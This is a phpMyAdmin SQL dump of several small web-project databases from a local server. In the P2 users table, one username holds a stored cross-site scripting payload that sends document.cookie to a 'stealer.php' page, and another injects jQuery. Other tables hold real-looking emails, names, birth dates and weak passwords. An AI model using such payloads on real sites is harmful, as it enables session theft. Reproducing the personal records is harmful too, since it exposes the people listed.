-- phpMyAdmin SQL Dump
-- version 4.0.4.1
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Aug 31, 2016 at 02:11 PM
-- Server version: 5.6.12
-- PHP Version: 5.5.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `KwaggasRand`
--
CREATE DATABASE IF NOT EXISTS `KwaggasRand` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
USE `KwaggasRand`;

-- --------------------------------------------------------

--
-- Table structure for table `tbPersonnel`
--

CREATE TABLE IF NOT EXISTS `tbPersonnel` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `surname` varchar(200) NOT NULL,
  `pId` varchar(100) NOT NULL,
  `password` varchar(8) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `tbPersonnel`
--

INSERT INTO `tbPersonnel` (`id`, `name`, `surname`, `pId`, `password`) VALUES
(1, 'Ingrid', 'Strydom', '123456789', 'ingridSt');

-- --------------------------------------------------------

--
-- Table structure for table `tbUpdates`
--

CREATE TABLE IF NOT EXISTS `tbUpdates` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `date` date NOT NULL,
  `update` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=10 ;

--
-- Dumping data for table `tbUpdates`
--

INSERT INTO `tbUpdates` (`id`, `date`, `update`) VALUES
(1, '2016-05-11', 'Welcome to our brand new website! #KwaggasRule'),
(6, '2016-05-12', 'Sport Day this Saturday! Make sure you get down here for some fun!'),
(7, '2016-05-12', 'Reminder: Next week Wednesday is photo day! Dress up nicely...'),
(8, '2016-05-12', 'HI'),
(9, '2016-05-12', 'hello');
--
-- Database: `P2`
--
CREATE DATABASE IF NOT EXISTS `P2` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
USE `P2`;

-- --------------------------------------------------------

--
-- Table structure for table `tbTodo`
--

CREATE TABLE IF NOT EXISTS `tbTodo` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NOT NULL,
  `username` varchar(100) NOT NULL,
  `task` varchar(100) NOT NULL,
  `date` date NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `tbTodo`
--

INSERT INTO `tbTodo` (`id`, `userid`, `username`, `task`, `date`) VALUES
(2, 6, 'Weich14', 'Clean room', '2018-02-21'),
(3, 8, 'Batman', 'Save Gotham', '2011-05-13');

-- --------------------------------------------------------

--
-- Table structure for table `tbUsers`
--

CREATE TABLE IF NOT EXISTS `tbUsers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(5000) NOT NULL,
  `password` varchar(100) NOT NULL,
  `type` varchar(5) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=13 ;

--
-- Dumping data for table `tbUsers`
--

INSERT INTO `tbUsers` (`id`, `username`, `password`, `type`) VALUES
(6, 'Weich14', 'e2d5cd0', 'Admin'),
(8, 'Batman', '019bfd9', 'User'),
(11, 'location.href = â€˜http://localhost/stealer.php?cookie=â€™+document.cookie;', 'e3b0c44', 'Admin'),
(12, '$(document).ready(function(){$("body").css("background-color","#000000");})', 'e3b0c44', 'Admin');
--
-- Database: `PAWS`
--
CREATE DATABASE IF NOT EXISTS `PAWS` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
USE `PAWS`;

-- --------------------------------------------------------

--
-- Table structure for table `tbEvents`
--

CREATE TABLE IF NOT EXISTS `tbEvents` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `description` text NOT NULL,
  `date` date NOT NULL,
  `image` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `tbEvents`
--

INSERT INTO `tbEvents` (`id`, `name`, `description`, `date`, `image`) VALUES
(1, 'Doge Day', 'Such wow, much party, come check it out!', '2020-12-02', '/Events/doge.jpg'),
(2, 'Just another Day', 'Dubble much wow!', '2016-09-07', 'Events/doge.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `tbUsers`
--

CREATE TABLE IF NOT EXISTS `tbUsers` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(150) NOT NULL,
  `surname` varchar(150) NOT NULL,
  `dob` date NOT NULL,
  `email` varchar(150) NOT NULL,
  `password` varchar(8) NOT NULL,
  `type` varchar(100) NOT NULL,
  `profilepic` varchar(100) NOT NULL,
  `event` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=11 ;

--
-- Dumping data for table `tbUsers`
--

INSERT INTO `tbUsers` (`id`, `name`, `surname`, `dob`, `email`, `password`, `type`, `profilepic`, `event`) VALUES
(4, 'Adolf Weich', 'Malan', '1993-02-21', 'weich14.malan@gmail.com', 'e2d5cd0', 'Admin', 'Profile_Pics/4_adolfweich_malan.jpeg', 1),
(5, 'Bruce', 'Wayne', '0000-00-00', 'batman@yahoo.com', '019bfd9', 'User', '', 0),
(7, 'Emma', 'Watson', '1989-12-02', 'emma@hogwarts.com', '874cd13', 'User', '', 0),
(8, 'Harley', 'Quinzel', '0001-01-01', 'haha@hotmail.com', '1ac31aa', 'User', '', 0),
(9, 'Joker', 'Haha', '2001-10-16', 'haha@joke.com', '0ffe1ab', 'User', '', 0);
--
-- Database: `cdcol`
--
CREATE DATABASE IF NOT EXISTS `cdcol` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
USE `cdcol`;

-- --------------------------------------------------------

--
-- Table structure for table `cds`
--

CREATE TABLE IF NOT EXISTS `cds` (
  `titel` varchar(200) DEFAULT NULL,
  `interpret` varchar(200) DEFAULT NULL,
  `jahr` int(11) DEFAULT NULL,
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=13 ;

--
-- Dumping data for table `cds`
--

INSERT INTO `cds` (`titel`, `interpret`, `jahr`, `id`) VALUES
('Beauty', 'Ryuichi Sakamoto', 1990, 1),
('Goodbye Country (Hello Nightclub)', 'Groove Armada', 2001, 4),
('Glee', 'Bran Van 3000', 1997, 5);
--
-- Database: `db_exam`
--
CREATE DATABASE IF NOT EXISTS `db_exam` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
USE `db_exam`;

-- --------------------------------------------------------

--
-- Table structure for table `tbUser`
--

CREATE TABLE IF NOT EXISTS `tbUser` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(100) NOT NULL,
  `age` int(11) NOT NULL,
  `date` date NOT NULL,
  `satisfaction` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `tbUser`
--

INSERT INTO `tbUser` (`id`, `email`, `age`, `date`, `satisfaction`) VALUES
(1, 'weich14.malan@gmail.com', 22, '2015-11-25', 9),
(2, 'weich14.malan@gmail.com', 22, '2015-11-25', 9),
(3, 'weich14.malan@gmail.com', 22, '2015-11-25', 9),
(4, 'weich14.malan@gmail.com', 22, '2015-11-25', 9),
(5, 'janwilkens@mweb.co.za', 19, '2015-11-25', 4);
--
-- Database: `phpmyadmin`
--
CREATE DATABASE IF NOT EXISTS `phpmyadmin` DEFAULT CHARACTER SET utf8 COLLATE utf8_bin;
USE `phpmyadmin`;

-- --------------------------------------------------------

--
-- Table structure for table `pma__bookmark`
--

CREATE TABLE IF NOT EXISTS `pma__bookmark` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `dbase` varchar(255) COLLATE utf8_bin NOT NULL DEFAULT '',
  `user` varchar(255) COLLATE utf8_bin NOT NULL DEFAULT '',
  `label` varchar(255) CHARACTER SET utf8 NOT NULL DEFAULT '',
  `query` text COLLATE utf8_bin NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Bookmarks' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `pma__column_info`
--

CREATE TABLE IF NOT EXISTS `pma__column_info` (
  `id` int(5) unsigned NOT NULL AUTO_INCREMENT,
  `db_name` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `table_name` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `column_name` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `comment` varchar(255) CHARACTER SET utf8 NOT NULL DEFAULT '',
  `mimetype` varchar(255) CHARACTER SET utf8 NOT NULL DEFAULT '',
  `transformation` varchar(255) COLLATE utf8_bin NOT NULL DEFAULT '',
  `transformation_options` varchar(255) COLLATE utf8_bin NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `db_name` (`db_name`,`table_name`,`column_name`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Column information for phpMyAdmin' AUTO_INCREMENT=77 ;

--
-- Dumping data for table `pma__column_info`
--

INSERT INTO `pma__column_info` (`id`, `db_name`, `table_name`, `column_name`, `comment`, `mimetype`, `transformation`, `transformation_options`) VALUES
(1, 'db_exam', 'tbUser', 'id', '', '', '_', ''),
(2, 'db_exam', 'tbUser', 'email', '', '', '_', ''),
(3, 'db_exam', 'tbUser', 'age', '', '', '_', ''),
(4, 'db_exam', 'tbUser', 'date', '', '', '_', ''),
(5, 'db_exam', 'tbUser', 'satisfaction', '', '', '_', ''),
(72, 'PAWS', 'tbEvents', 'description', '', '', '_', ''),
(73, 'PAWS', 'tbEvents', 'date', '', '', '_', ''),
(74, 'PAWS', 'tbEvents', 'image', '', '', '_', ''),
(75, 'PAWS', 'tbUsers', 'profilepic', '', '', '_', ''),
(76, 'PAWS', 'tbUsers', 'event', '', '', '_', ''),
(71, 'PAWS', 'tbEvents', 'name', '', '', '_', ''),
(70, 'PAWS', 'tbEvents', 'id', '', '', '_', ''),
(69, 'PAWS', 'tbUsers', 'type', '', '', '_', ''),
(68, 'P2', 'tbTodo', 'date', '', '', '_', ''),
(67, 'P2', 'tbTodo', 'task', '', '', '_', ''),
(66, 'P2', 'tbTodo', 'username', '', '', '_', ''),
(65, 'P2', 'tbTodo', 'userid', '', '', '_', ''),
(64, 'P2', 'tbTodo', 'id', '', '', '_', ''),
(63, 'P2', 'tbUsers', 'type', '', '', '_', ''),
(62, 'P2', 'tbUsers', 'password', '', '', '_', ''),
(61, 'P2', 'tbUsers', 'username', '', '', '_', ''),
(60, 'P2', 'tbUsers', 'id', '', '', '_', ''),
(59, 'PAWS', 'tbUsers', 'password', '', '', '_', ''),
(56, 'PAWS', 'tbUsers', 'email', '', '', '_', ''),
(55, 'PAWS', 'tbUsers', 'dob', '', '', '_', ''),
(54, 'PAWS', 'tbUsers', 'surname', '', '', '_', ''),
(53, 'PAWS', 'tbUsers', 'name', '', '', '_', ''),
(52, 'PAWS', 'tbUsers', 'id', '', '', '_', '');

-- --------------------------------------------------------

--
-- Table structure for table `pma__designer_coords`
--

CREATE TABLE IF NOT EXISTS `pma__designer_coords` (
  `db_name` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `table_name` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `x` int(11) DEFAULT NULL,
  `y` int(11) DEFAULT NULL,
  `v` tinyint(4) DEFAULT NULL,
  `h` tinyint(4) DEFAULT NULL,
  PRIMARY KEY (`db_name`,`table_name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Table coordinates for Designer';

-- --------------------------------------------------------

--
-- Table structure for table `pma__history`
--

CREATE TABLE IF NOT EXISTS `pma__history` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `db` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `table` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `timevalue` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `sqlquery` text COLLATE utf8_bin NOT NULL,
  PRIMARY KEY (`id`),
  KEY `username` (`username`,`db`,`table`,`timevalue`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='SQL history for phpMyAdmin' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `pma__pdf_pages`
--

CREATE TABLE IF NOT EXISTS `pma__pdf_pages` (
  `db_name` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `page_nr` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `page_descr` varchar(50) CHARACTER SET utf8 NOT NULL DEFAULT '',
  PRIMARY KEY (`page_nr`),
  KEY `db_name` (`db_name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='PDF relation pages for phpMyAdmin' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `pma__recent`
--

CREATE TABLE IF NOT EXISTS `pma__recent` (
  `username` varchar(64) COLLATE utf8_bin NOT NULL,
  `tables` text COLLATE utf8_bin NOT NULL,
  PRIMARY KEY (`username`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Recently accessed tables';

--
-- Dumping data for table `pma__recent`
--

INSERT INTO `pma__recent` (`username`, `tables`) VALUES
('root', '[{"db":"PAWS","table":"tbUsers"},{"db":"PAWS","table":"tbEvents"},{"db":"P2","table":"tbUsers"},{"db":"P2","table":"tbTodo"},{"db":"PAWS","table":"Personnel"},{"db":"PAWS","table":"Users"},{"db":"PAWS","table":"Events"},{"db":"PAWS","table":"Admin"},{"db":"KwaggasRand","table":"tbUpdates"},{"db":"KwaggasRand","table":"tbPersonnel"}]');

-- --------------------------------------------------------

--
-- Table structure for table `pma__relation`
--

CREATE TABLE IF NOT EXISTS `pma__relation` (
  `master_db` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `master_table` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `master_field` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `foreign_db` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `foreign_table` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `foreign_field` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  PRIMARY KEY (`master_db`,`master_table`,`master_field`),
  KEY `foreign_field` (`foreign_db`,`foreign_table`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Relation table';

-- --------------------------------------------------------

--
-- Table structure for table `pma__table_coords`
--

CREATE TABLE IF NOT EXISTS `pma__table_coords` (
  `db_name` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `table_name` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `pdf_page_number` int(11) NOT NULL DEFAULT '0',
  `x` float unsigned NOT NULL DEFAULT '0',
  `y` float unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`db_name`,`table_name`,`pdf_page_number`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Table coordinates for phpMyAdmin PDF output';

-- --------------------------------------------------------

--
-- Table structure for table `pma__table_info`
--

CREATE TABLE IF NOT EXISTS `pma__table_info` (
  `db_name` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `table_name` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  `display_field` varchar(64) COLLATE utf8_bin NOT NULL DEFAULT '',
  PRIMARY KEY (`db_name`,`table_name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Table information for phpMyAdmin';

-- --------------------------------------------------------

--
-- Table structure for table `pma__table_uiprefs`
--

CREATE TABLE IF NOT EXISTS `pma__table_uiprefs` (
  `username` varchar(64) COLLATE utf8_bin NOT NULL,
  `db_name` varchar(64) COLLATE utf8_bin NOT NULL,
  `table_name` varchar(64) COLLATE utf8_bin NOT NULL,
  `prefs` text COLLATE utf8_bin NOT NULL,
  `last_update` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`username`,`db_name`,`table_name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='Tables'' UI preferences';

-- --------------------------------------------------------

--
-- Table structure for table `pma__tracking`
--

CREATE TABLE IF NOT EXISTS `pma__tracking` (
  `db_name` varchar(64) COLLATE utf8_bin NOT NULL,
  `table_name` varchar(64) COLLATE utf8_bin NOT NULL,
  `version` int(10) unsigned NOT NULL,
  `date_created` datetime NOT NULL,
  `date_updated` datetime NOT NULL,
  `schema_snapshot` text COLLATE utf8_bin NOT NULL,
  `schema_sql` text COLLATE utf8_bin,
  `data_sql` longtext COLLATE utf8_bin,
  `tracking` set('UPDATE','REPLACE','INSERT','DELETE','TRUNCATE','CREATE DATABASE','ALTER DATABASE','DROP DATABASE','CREATE TABLE','ALTER TABLE','RENAME TABLE','DROP TABLE','CREATE INDEX','DROP INDEX','CREATE VIEW','ALTER VIEW','DROP VIEW') COLLATE utf8_bin DEFAULT NULL,
  `tracking_active` int(1) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`db_name`,`table_name`,`version`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin ROW_FORMAT=COMPACT COMMENT='Database changes tracking for phpMyAdmin';

-- --------------------------------------------------------

--
-- Table structure for table `pma__userconfig`
--

CREATE TABLE IF NOT EXISTS `pma__userconfig` (
  `username` varchar(64) COLLATE utf8_bin NOT NULL,
  `timevalue` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `config_data` text COLLATE utf8_bin NOT NULL,
  PRIMARY KEY (`username`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT='User preferences storage for phpMyAdmin';

--
-- Dumping data for table `pma__userconfig`
--

INSERT INTO `pma__userconfig` (`username`, `timevalue`, `config_data`) VALUES
('root', '2016-08-30 20:50:54', '{"collation_connection":"utf8_bin"}');
--
-- Database: `test`
--
CREATE DATABASE IF NOT EXISTS `test` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
USE `test`;

DELIMITER $$
--
-- Procedures
--
CREATE DEFINER=`root`@`localhost` PROCEDURE `test_multi_sets`()
    DETERMINISTIC
begin
        select user() as first_col;
        select user() as first_col, now() as second_col;
        select user() as first_col, now() as second_col, now() as third_col;
        end$$

DELIMITER ;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
